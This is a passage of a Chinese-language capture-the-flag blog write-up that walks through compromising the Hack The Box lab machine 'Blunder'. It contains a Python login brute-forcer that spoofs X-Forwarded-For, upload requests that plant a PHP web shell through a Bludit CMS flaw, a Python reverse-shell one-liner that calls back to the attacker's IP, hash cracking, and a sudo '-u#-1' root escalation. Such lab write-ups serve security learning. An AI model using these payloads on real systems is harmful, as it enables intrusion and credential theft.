httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-generator: Blunder</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Blunder | A blunder of interesting facts</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Sun May 31 19:18:52 2020 -- 1 IP address (1 host up) scanned in 40.22 seconds</span></span><br></pre></td></tr></table></figure>
+<p>dirsearch扫描路径：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ sudo dirsearch -u http://blunder.htb -e *</span><br><span class="line">Extensions: 46060.txt | HTTP method: get | Threads: 10 | Wordlist size: 6124</span><br><span class="line">Target: http://blunder.htb</span><br><span class="line"></span><br><span class="line">[17:25:56] Starting: </span><br><span class="line">[17:25:59] 200 -    7KB - /%3f/</span><br><span class="line">[17:26:07] 200 -  563B  - /.gitignore</span><br><span class="line">[17:26:24] 200 -    7KB - /0                         </span><br><span class="line">[17:26:41] 200 -    3KB - /about                     </span><br><span class="line">[17:26:49] 301 -    0B  - /admin  -&gt;  http://10.10.10.191/admin/</span><br><span class="line">[17:26:53] 200 -    2KB - /admin/.config</span><br><span class="line">[17:26:53] 200 -    2KB - /admin/</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">[17:29:40] 200 -    2KB - /admin/web/</span><br><span class="line">[17:29:40] 200 -    2KB - /admin/login.htm</span><br><span class="line">[17:31:22] 301 -    0B  - /domcfg.nsf/?open  -&gt;  http://10.10.10.191/domcfg.nsf</span><br><span class="line">[17:32:02] 200 -   30B  - /install.php</span><br><span class="line">[17:32:14] 200 -    1KB - /LICENSE</span><br><span class="line">[17:33:29] 200 -    3KB - /README.md</span><br><span class="line">[17:33:33] 200 -   22B  - /robots.txt</span><br></pre></td></tr></table></figure>
+<p><code>admin</code>需要登录名和密码，<code>.gitignore</code>和<code>robots.txt</code>没有可利用的信息，现在应该是要寻找后台的登陆凭证。</p>
+<p>wfuzz扫描web目录下有没有什么敏感文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 -u <span class="string">&quot;http://blunder.htb/FUZZ.txt&quot;</span> -t 100</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://blunder.htb/FUZZ.txt</span><br><span class="line">Total requests: 4652</span><br><span class="line"></span><br><span class="line">===================================================================</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload</span><br><span class="line">===================================================================</span><br><span class="line"></span><br><span class="line">000003513:   200        1 L      4 W      22 Ch       <span class="string">&quot;robots&quot;</span></span><br><span class="line">000004119:   200        4 L      23 W     118 Ch      <span class="string">&quot;todo&quot;</span></span><br><span class="line"></span><br><span class="line">Total time: 44.66474</span><br><span class="line">Processed Requests: 4652</span><br><span class="line">Filtered Requests: 4650</span><br><span class="line">Requests/sec.: 104.1537</span><br></pre></td></tr></table></figure>
+<p><code>todo.txt</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-Update the CMS</span><br><span class="line">-Turn off FTP - DONE</span><br><span class="line">-Remove old users - DONE</span><br><span class="line">-Inform fergus that the new blog needs images - PENDING</span><br></pre></td></tr></table></figure>
+<p>盲猜一手<code>fergus</code>应该登录名<code>username</code>，再去寻找password。找了大半天没什么进展，按照HTB的尿性，应该要用主页上的信息生成自定义的字典。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cewl -w wordlists.txt -d 10 -m 1 http://blunder.htb/</span><br><span class="line"></span><br><span class="line">$ wc wordlist.txt </span><br><span class="line"> 354  354 2459 wordlist.txt</span><br></pre></td></tr></table></figure>
+<p>用burp和wfuzz工具都没能Brute Force出来，只能写Python脚本爆破了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open_resources</span>(<span class="params">file_path</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [item.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>) <span class="keyword">for</span> item <span class="keyword">in</span> open(file_path).readlines()]</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://10.10.10.191&#x27;</span></span><br><span class="line">login_url = host + <span class="string">&#x27;/admin/login&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;fergus&#x27;</span></span><br><span class="line">wordlist = open_resources(<span class="string">&#x27;/home/Hackthebox/Blunder/wordlist.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> wordlist:</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    login_page = session.get(login_url)</span><br><span class="line">    csrf_token = re.search(<span class="string">&#x27;input.+?name=&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;&#x27;</span>, login_page.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;[*] Trying: &#123;p&#125;&#x27;</span>.format(p = password))</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;X-Forwarded-For&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: login_url</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;tokenCSRF&#x27;</span>: csrf_token,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;save&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;location&#x27;</span> <span class="keyword">in</span> login_result.headers:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;/admin/dashboard&#x27;</span> <span class="keyword">in</span> login_result.headers[<span class="string">&#x27;location&#x27;</span>]:</span><br><span class="line">            print()</span><br><span class="line">            print(<span class="string">&#x27;SUCCESS: Password found!&#x27;</span>)</span><br><span class="line">            print(<span class="string">&#x27;Use &#123;u&#125;:&#123;p&#125; to login.&#x27;</span>.format(u = username, p = password))</span><br><span class="line">            print()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>跑出来的结果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] Trying: character</span><br><span class="line">[*] Trying: RolandDeschain</span><br><span class="line">()</span><br><span class="line">SUCCESS: Password found!</span><br><span class="line">Use fergus:RolandDeschain to login.</span><br></pre></td></tr></table></figure>
+<p>用<code>fergus:RolandDeschain </code>登录后台管理系统：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200601185345.png" alt=""></p>
+<p>发现这个使用开源的<code>Bludit CMS</code>搭建的，Google一下看有没有公开的CVE：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16113">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16113</a></p>
+</blockquote>
+<p>顺着References中的Github链接还找到作者发现CVE的过程，而且还是中国人，@christa。(这次终于不用看英文的利用过程了😄）</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://christa.top/details/46/">https://christa.top/details/46/</a></p>
+</blockquote>
+<p>首先上传<code>.htaccess</code>文件，用burp改包绕过前端的后缀名验证：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;admin&#x2F;ajax&#x2F;upload-images HTTP&#x2F;1.1</span><br><span class="line">Host: blunder.htb</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;blunder.htb&#x2F;admin&#x2F;new-content</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------5424398841862763197378512212</span><br><span class="line">Content-Length: 531</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: BLUDITREMEMBERUSERNAME&#x3D;fergus; BLUDITREMEMBERTOKEN&#x3D;d08d8cfe8c70b89c242b0a33531998d7; BLUDIT-KEY&#x3D;dpodie00jad4a6akmo5hookqd2</span><br><span class="line"></span><br><span class="line">-----------------------------5424398841862763197378512212</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;images[]&quot;; filename&#x3D;&quot;.htaccess&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">RewriteEngine Off</span><br><span class="line">-----------------------------5424398841862763197378512212</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uuid&quot;</span><br><span class="line"></span><br><span class="line">0fad6e18e5d590f2af2b005ac4f7f80f</span><br><span class="line">-----------------------------5424398841862763197378512212</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;tokenCSRF&quot;</span><br><span class="line"></span><br><span class="line">7ca474f9c654ff0e46761ac0e435423a5a8c012a</span><br><span class="line">-----------------------------5424398841862763197378512212--</span><br></pre></td></tr></table></figure>
+<p>再上传shell文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;admin&#x2F;ajax&#x2F;upload-images HTTP&#x2F;1.1</span><br><span class="line">Host: blunder.htb</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;blunder.htb&#x2F;admin&#x2F;new-content</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------5424398841862763197378512212</span><br><span class="line">Content-Length: 540</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: BLUDITREMEMBERUSERNAME&#x3D;fergus; BLUDITREMEMBERTOKEN&#x3D;d08d8cfe8c70b89c242b0a33531998d7; BLUDIT-KEY&#x3D;dpodie00jad4a6akmo5hookqd2</span><br><span class="line"></span><br><span class="line">-----------------------------5424398841862763197378512212</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;images[]&quot;; filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</span><br><span class="line">-----------------------------5424398841862763197378512212</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uuid&quot;</span><br><span class="line"></span><br><span class="line">0fad6e18e5d590f2af2b005ac4f7f80f</span><br><span class="line">-----------------------------5424398841862763197378512212</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;tokenCSRF&quot;</span><br><span class="line"></span><br><span class="line">7ca474f9c654ff0e46761ac0e435423a5a8c012a</span><br><span class="line">-----------------------------5424398841862763197378512212--</span><br></pre></td></tr></table></figure>
+<p>本地监听端口，浏览器访问shell文件，<code>cmd</code>参数如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;blunder.htb&#x2F;bl-content&#x2F;tmp&#x2F;shell.php?cmd&#x3D;python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.4&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
+<p>本机得到reverse shell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Blunder [17:25:45] </span><br><span class="line">$ nc -lvnp 9999</span><br><span class="line">listening on [any] 9999 ...</span><br><span class="line">connect to [10.10.14.4] from (UNKNOWN) [10.10.10.191] 59878</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line">$ python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">www-data@blunder:&#x2F;var&#x2F;www&#x2F;bludit-3.9.2&#x2F;bl-content&#x2F;tmp$ id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br></pre></td></tr></table></figure>
+<h3 id="Getting-User-Access">Getting User Access</h3>
+<p>接下来的工作就是要找提权的用户名和密码了，这种简单难度的靶机一般会在某些文件中泄露这些信息~</p>
+<p>经过一番查找，发现在<code>/var/www</code>目录下还有另外一个新版本的<code>Bludit CMS</code>，其中有一个文件是在<code>/var/www/bludit-3.10.0a/bl-content/databases</code>下面，文件名是<code>users.php</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> defined(<span class="string">&#x27;BLUDIT&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;Bludit CMS.&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;Hugo&quot;</span>,</span><br><span class="line">        <span class="string">&quot;firstName&quot;</span>: <span class="string">&quot;Hugo&quot;</span>,</span><br><span class="line">        <span class="string">&quot;lastName&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;role&quot;</span>: <span class="string">&quot;User&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;registered&quot;</span>: <span class="string">&quot;2019-11-27 07:40:55&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tokenRemember&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tokenAuth&quot;</span>: <span class="string">&quot;b380cb62057e9da47afce66b4615107d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tokenAuthTTL&quot;</span>: <span class="string">&quot;2009-03-15 14:00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;twitter&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;facebook&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;instagram&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;codepen&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;linkedin&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;github&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;gitlab&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>很明显有一个<code>password</code>，看样子应该是经过了一次hash，用<code>hash-identifier</code>查看加密方式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Possible Hashs:</span><br><span class="line">[+] SHA-1</span><br><span class="line">[+] MySQL5 - SHA-1(SHA-1(<span class="variable">$pass</span>))</span><br><span class="line"></span><br><span class="line">Least Possible Hashs:</span><br><span class="line">[+] Tiger-160</span><br><span class="line">[+] Haval-160</span><br><span class="line">[+] RipeMD-160</span><br><span class="line">[+] SHA-1(HMAC)</span><br><span class="line">[+] Tiger-160(HMAC)</span><br><span class="line">[+] RipeMD-160(HMAC)</span><br><span class="line">[+] Haval-160(HMAC)</span><br><span class="line">[+] SHA-1(MaNGOS)</span><br><span class="line">[+] SHA-1(MaNGOS2)</span><br><span class="line">[+] sha1(<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line">[+] sha1(<span class="variable">$salt</span>.<span class="variable">$pass</span>)</span><br><span class="line">[+] sha1(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] sha1(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] sha1(<span class="variable">$salt</span>.sha1(<span class="variable">$pass</span>))</span><br><span class="line">[+] sha1(<span class="variable">$salt</span>.sha1(<span class="variable">$salt</span>.sha1(<span class="variable">$pass</span>)))</span><br><span class="line">[+] sha1(<span class="variable">$username</span>.<span class="variable">$pass</span>)</span><br><span class="line">[+] sha1(<span class="variable">$username</span>.<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line">[+] sha1(md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] sha1(md5(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] sha1(md5(sha1(<span class="variable">$pass</span>)))</span><br><span class="line">[+] sha1(sha1(<span class="variable">$pass</span>))</span><br><span class="line">[+] sha1(sha1(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] sha1(sha1(<span class="variable">$pass</span>).substr(<span class="variable">$pass</span>,0,3))</span><br><span class="line">[+] sha1(sha1(<span class="variable">$salt</span>.<span class="variable">$pass</span>))</span><br><span class="line">[+] sha1(sha1(sha1(<span class="variable">$pass</span>)))</span><br><span class="line">[+] sha1(strtolower(<span class="variable">$username</span>).<span class="variable">$pass</span>)</span><br><span class="line">--------------------------------------------------</span><br></pre></td></tr></table></figure>
+<p>在线加密工具：<a target="_blank" rel="noopener" href="https://md5decrypt.net/en/Sha1">https://md5decrypt.net/en/Sha1</a></p>
+<p>输入<code>faca404fd5c0a31cf1897b823c695c85cffeb98d</code>得到明文<code>Password120</code>。</p>
+<p>su切换用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo</span><br><span class="line">su hugo</span><br><span class="line">Password: Password120 </span><br><span class="line"></span><br><span class="line">hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ id</span><br><span class="line">id</span><br><span class="line">uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)</span><br><span class="line">hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ <span class="built_in">cd</span> </span><br><span class="line">catcd</span><br><span class="line">hugo@blunder:~$  user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">947a-----------------------a7bb</span><br></pre></td></tr></table></figure>
+<h3 id="Getting-Root-Access">Getting Root Access</h3>
+<p>按照套路：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hugo@blunder:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Password: Password120</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for hugo on blunder:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User hugo may run the following commands on blunder:</span><br><span class="line">    (ALL, !root) &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+<p>Google <code>(ALL, !root) /bin/bash</code>，有下面这种提权方式：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a></p>
+</blockquote>
+<p>很简单，一个命令解决：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hugo@blunder:~$ sudo -u#-1 &#x2F;bin&#x2F;bash</span><br><span class="line">sudo -u#-1 &#x2F;bin&#x2F;bash</span><br><span class="line">root@blunder:&#x2F;home&#x2F;hugo# id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;1001(hugo) groups&#x3D;1001(hugo)</span><br><span class="line">root@blunder:&#x2F;home&#x2F;hugo# cd</span><br><span class="line">cd</span><br><span class="line">root@blunder:&#x2F;# cat &#x2F;root&#x2F;root.txt</span><br><span class="line">cat &#x2F;root&#x2F;root.txt</span><br><span class="line">b4c0------------------------d45f</span><br></pre></td></tr></table></figure>
+<p>这个靶机除了找密码的过程，其他还是算蛮简单的~~</p>
+<h2 id="0x04-Reference">0x04 Reference</h2>
+<table>
+<thead>
+<tr>
+<th>Topic</th>
+<th>Url</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Bludit CVE</td>
+<td><a target="_blank" rel="noopener" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16113">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16113</a></td>
+</tr>
+<tr>
+<td>Bludit CVE</td>
+<td><a target="_blank" rel="noopener" href="https://christa.top/details/46/">https://christa.top/details/46/</a></td>
+</tr>
+<tr>
+<td>Sha1 decryption</td>
+<td><a target="_blank" rel="noopener" href="https://md5decrypt.net/en/Sha1">https://md5decrypt.net/en/Sha1</a></td>
+</tr>
+<tr>
+<td>sudo priv</td>
+<td><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a></td>
+</tr>
+</tbody>
+</table>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+    <div id="disqus_thread"></div>
+    <script>
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://ca01h.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image 
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="c"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div> -->
+
+    <!-- Author title
+    <div class="author-title">
+      <div>ca01h</div>
+      <div>2020-06-01</div>
+    </div> -->
+	
+	<script src="https://www.hackthebox.eu/badge/212159"></script>
+  </div> 
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+	  <i class="fas fa-folder-open"></i>&nbsp;
+      <a class="category-link" href="/categories/%E9%9D%B6%E6%9C%BA/">靶机</a>
+	  </br>
